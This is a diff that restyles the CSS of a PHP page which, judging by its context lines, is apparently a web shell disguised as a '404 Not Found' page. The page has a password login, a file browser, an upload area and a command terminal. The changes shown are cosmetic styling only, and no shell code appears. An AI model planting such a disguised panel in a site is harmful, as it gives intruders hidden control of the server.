@@ -30,14 +30,57 @@ if (!isset($_SESSION['auth'])) {
         <title>Authentication Required</title>
 		<meta name="robots" content="noindex,nofollow">
         <style>
-        body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace}
-        .login{background:#111;border:2px solid #a80202;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,255,0,.3)}
-        h2{color:#a80202;text-align:center;margin-bottom:20px}
-        input{width:100%;padding:12px;background:#000;border:1px solid #a80202;color:#a80202;font:14px monospace;border-radius:5px;margin-bottom:15px}
-        button{width:100%;padding:12px;background:#a80202;color:#000;border:none;font-weight:bold;cursor:pointer;border-radius:5px;font:14px monospace}
-        button:hover{background:#0dd}
-        .eagle{font-size:50px;text-align:center;margin-bottom:15px}
-        </style>
+body {
+    background: #000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    font-family: monospace;
+}
+.login {
+    background: #111;
+    border: 2px solid darkred;
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 0 20px rgba(139,0,0,0.3); /* darkred shadow */
+}
+h2 {
+    color: darkred;
+    text-align: center;
+    margin-bottom: 20px;
+}
+input {
+    width: 100%;
+    padding: 12px;
+    background: #000;
+    border: 1px solid darkred;
+    color: darkred;
+    font: 14px monospace;
+    border-radius: 5px;
+    margin-bottom: 15px;
+}
+button {
+    width: 100%;
+    padding: 12px;
+    background: darkred;
+    color: #000;
+    border: none;
+    font-weight: bold;
+    cursor: pointer;
+    border-radius: 5px;
+    font: 14px monospace;
+}
+button:hover {
+    background: crimson;
+}
+.eagle {
+    font-size: 50px;
+    text-align: center;
+    margin-bottom: 15px;
+}
+</style>
+
         </head>
         <body>
         <div class="login">
@@ -240,49 +283,202 @@ $sysInfo = [
 <title>404 Not Found</title>
 <meta name="robots" content="noindex,nofollow">
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:linear-gradient(135deg,#000,#1a1a1a);color:#a80202;font:13px 'Courier New',monospace;padding:10px;min-height:100vh}
-.container{max-width:1400px;margin:0 auto}
-.header{text-align:center;padding:20px;border-bottom:2px solid #a80202;margin-bottom:20px;background:rgba(0,255,0,.05);border-radius:10px;position:relative}
-.logout{position:absolute;right:20px;top:20px;background:#a80202;color:#000;padding:8px 15px;border-radius:5px;text-decoration:none;font-weight:bold;font-size:12px}
-.logout:hover{background:#0dd}
-.eagle{font-size:50px}
-.title{font-size:18px;margin-top:10px;font-weight:bold}
-.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-bottom:20px;background:rgba(0,255,0,.05);padding:15px;border:1px solid #a80202;border-radius:10px}
-.info-item{padding:10px;background:rgba(0,0,0,.5);border-left:3px solid #a80202}
-.info-label{font-size:11px;font-weight:bold;color:#a80202}
-.info-value{font-size:12px;color:#fff;word-wrap:break-word}
-.tabs{display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap}
-.tab{background:#111;border:1px solid #a80202;color:#a80202;padding:10px 20px;cursor:pointer;border-radius:5px;transition:.3s;font-weight:bold}
-.tab:hover,.tab.active{background:#a80202;color:#000}
-.section{display:none;background:rgba(0,255,0,.05);border:1px solid #a80202;border-radius:10px;padding:20px}
-.section.active{display:block}
-.path-nav{background:#111;padding:12px;border-radius:5px;margin-bottom:15px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
-.path-nav a{color:#a80202;text-decoration:none;padding:5px 10px;background:#222;border-radius:3px;font-size:12px;transition:.2s}
-.path-nav a:hover{background:#a80202;color:#000}
-.file-list{list-style:none;max-height:500px;overflow-y:auto;border:1px solid #a80202;border-radius:5px;background:#000;padding:10px}
-.file-item{display:flex;align-items:center;justify-content:space-between;padding:10px;margin:5px 0;background:#111;border-radius:5px;cursor:pointer;transition:.2s}
-.file-item:hover{background:#222;transform:translateX(5px)}
-.file-name{flex:1;color:#a80202;font-size:13px}
-.file-meta{font-size:11px;color:#666;margin-top:3px}
-.file-actions{display:flex;gap:5px}
-.btn{background:#a80202;color:#000;border:none;padding:6px 12px;cursor:pointer;border-radius:3px;font-size:11px;font-weight:bold;transition:.2s}
-.btn:hover{background:#0dd;transform:scale(1.05)}
-.btn-secondary{background:#666;color:#fff}
-.btn-secondary:hover{background:#888}
-.input-group{display:flex;gap:10px;margin-bottom:15px}
-.input-group input,.input-group textarea{flex:1;background:#000;border:1px solid #a80202;color:#a80202;padding:10px;font:13px 'Courier New',monospace;border-radius:5px}
-.input-group textarea{min-height:350px;font-size:12px}
-.terminal{background:#000;border:1px solid #a80202;border-radius:5px;padding:15px;min-height:400px;max-height:600px;overflow-y:auto;color:#fff;white-space:pre-wrap;word-wrap:break-word;font:12px 'Courier New',monospace;line-height:1.6}
-.quick-commands{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px}
-.quick-cmd{background:rgba(0,255,0,.1);border:1px solid #a80202;color:#a80202;padding:6px 12px;cursor:pointer;border-radius:3px;font-size:11px;transition:.2s}
-.quick-cmd:hover{background:rgba(0,255,0,.2);transform:translateY(-2px)}
-::-webkit-scrollbar{width:8px;height:8px}
-::-webkit-scrollbar-track{background:#000}
-::-webkit-scrollbar-thumb{background:#a80202;border-radius:4px}
-.upload-area{border:2px dashed #a80202;padding:30px;text-align:center;border-radius:5px;background:rgba(0,255,0,.02)}
-.upload-result{margin-top:15px;padding:10px;background:#111;border-radius:5px;color:#a80202}
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+body {
+    background: linear-gradient(135deg, #000, #1a1a1a);
+    color: darkred;
+    font: 13px 'Courier New', monospace;
+    padding: 10px;
+    min-height: 100vh;
+}
+.container {
+    max-width: 1400px;
+    margin: 0 auto;
+}
+.header {
+    text-align: center;
+    padding: 20px;
+    border-bottom: 2px solid darkred;
+    margin-bottom: 20px;
+    background: rgba(139,0,0,0.05);
+    border-radius: 10px;
+    position: relative;
+}
+.logout {
+    position: absolute;
+    right: 20px;
+    top: 20px;
+    background: darkred;
+    color: #000;
+    padding: 8px 15px;
+    border-radius: 5px;
+    text-decoration: none;
+    font-weight: bold;
+    font-size: 12px;
+}
+.logout:hover {
+    background: crimson;
+}
+.eagle { font-size: 50px; }
+.title { font-size: 18px; margin-top: 10px; font-weight: bold; }
+.info-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit,minmax(180px,1fr));
+    gap: 10px;
+    margin-bottom: 20px;
+    background: rgba(139,0,0,0.05);
+    padding: 15px;
+    border: 1px solid darkred;
+    border-radius: 10px;
+}
+.info-item {
+    padding: 10px;
+    background: rgba(0,0,0,0.5);
+    border-left: 3px solid darkred;
+}
+.info-label { font-size: 11px; font-weight: bold; color: darkred; }
+.info-value { font-size: 12px; color: #fff; word-wrap: break-word; }
+.tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
+.tab {
+    background: #111;
+    border: 1px solid darkred;
+    color: darkred;
+    padding: 10px 20px;
+    cursor: pointer;
+    border-radius: 5px;
+    transition: .3s;
+    font-weight: bold;
+}
+.tab:hover, .tab.active {
+    background: darkred;
+    color: #000;
+}
+.section {
+    display: none;
+    background: rgba(139,0,0,0.05);
+    border: 1px solid darkred;
+    border-radius: 10px;
+    padding: 20px;
+}
+.section.active { display: block; }
+.path-nav {
+    background: #111;
+    padding: 12px;
+    border-radius: 5px;
+    margin-bottom: 15px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-wrap: wrap;
+}
+.path-nav a {
+    color: darkred;
+    text-decoration: none;
+    padding: 5px 10px;
+    background: #222;
+    border-radius: 3px;
+    font-size: 12px;
+    transition: .2s;
+}
+.path-nav a:hover { background: darkred; color: #000; }
+.file-list {
+    list-style: none;
+    max-height: 500px;
+    overflow-y: auto;
+    border: 1px solid darkred;
+    border-radius: 5px;
+    background: #000;
+    padding: 10px;
+}
+.file-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px;
+    margin: 5px 0;
+    background: #111;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: .2s;
+}
+.file-item:hover { background: #222; transform: translateX(5px); }
+.file-name { flex: 1; color: darkred; font-size: 13px; }
+.file-meta { font-size: 11px; color: #666; margin-top: 3px; }
+.file-actions { display: flex; gap: 5px; }
+.btn {
+    background: darkred;
+    color: #000;
+    border: none;
+    padding: 6px 12px;
+    cursor: pointer;
+    border-radius: 3px;
+    font-size: 11px;
+    font-weight: bold;
+    transition: .2s;
+}
+.btn:hover { background: crimson; transform: scale(1.05); }
+.btn-secondary { background: #666; color: #fff; }
+.btn-secondary:hover { background: #888; }
+.input-group { display: flex; gap: 10px; margin-bottom: 15px; }
+.input-group input, .input-group textarea {
+    flex: 1;
+    background: #000;
+    border: 1px solid darkred;
+    color: darkred;
+    padding: 10px;
+    font: 13px 'Courier New', monospace;
+    border-radius: 5px;
+}
+.input-group textarea { min-height: 350px; font-size: 12px; }
+.terminal {
+    background: #000;
+    border: 1px solid darkred;
+    border-radius: 5px;
+    padding: 15px;
+    min-height: 400px;
+    max-height: 600px;
+    overflow-y: auto;
+    color: #fff;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+    font: 12px 'Courier New', monospace;
+    line-height: 1.6;
+}
+.quick-commands { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
+.quick-cmd {
+    background: rgba(139,0,0,0.1);
+    border: 1px solid darkred;
+    color: darkred;
+    padding: 6px 12px;
+    cursor: pointer;
+    border-radius: 3px;
+    font-size: 11px;
+    transition: .2s;
+}
+.quick-cmd:hover { background: rgba(139,0,0,0.2); transform: translateY(-2px); }
+::-webkit-scrollbar { width: 8px; height: 8px; }
+::-webkit-scrollbar-track { background: #000; }
+::-webkit-scrollbar-thumb { background: darkred; border-radius: 4px; }
+.upload-area {
+    border: 2px dashed darkred;
+    padding: 30px;
+    text-align: center;
+    border-radius: 5px;
+    background: rgba(139,0,0,0.02);
+}
+.upload-result {
+    margin-top: 15px;
+    padding: 10px;
+    background: #111;
+    border-radius: 5px;
+    color: darkred;
+}
 </style>
+
 </head>
 <body>
 <div class="container">
